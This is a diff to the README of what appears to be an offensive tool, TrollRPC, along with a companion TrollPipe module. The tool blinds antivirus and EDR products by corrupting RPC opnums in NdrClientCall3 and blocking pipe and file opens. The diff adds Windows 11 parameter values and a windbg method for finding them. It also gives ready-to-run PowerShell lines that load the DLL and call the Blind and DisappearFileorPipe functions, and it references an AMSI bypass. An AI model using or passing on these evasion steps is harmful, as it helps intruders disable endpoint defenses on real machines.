@@ -1,5 +1,10 @@
 ## UPDATES
 ```diff
+! UPDATE 09/07/2025
+! For windows 11, a working $Opnum_break is 0x00
+! How did i obtain this value? used windbg and attached to powershell with the following breakpoint bp rpcrt4!NdrClientCall3 "r rdx; g"
+```
+```diff
 ! UPDATE 11/06/2025
 ! Added TrollPipe.cs to block CreateFileW to Files or Named Pipes because some AV/EDR use that instead of RPC
 ! [TrollPipe]::DisappearFileorPipe("<pipe or file name>")
@@ -16,7 +21,13 @@ https://github.com/andreisss/Ghosting-AMSI released a amsi bypass by breaking Nd
 [System.Reflection.Assembly]::LoadFile("C:\TrollRPC.dll") 
 $UUID = "c503f532-443a-4c69-8300-ccd1fbdb3839"             # The UUID you are targetting
 $Opnum = 0x5E                                              # The opnum you are targetting
-$Opnum_break = 0x1F4                                       # Modify the opnum to an invalid value                   
+
+#WINDOWS 10 VALUE 
+$Opnum_break = 0x1F4                                       # Modify the opnum to an invalid value
+
+#WINDOWS 11 VALUE 
+$Opnum_break = 0x00                                        # Modify the opnum to an invalid value   
+            
 [TrollRPC]::Blind($UUID, $Opnum, $Opnum_break)
 ```
 
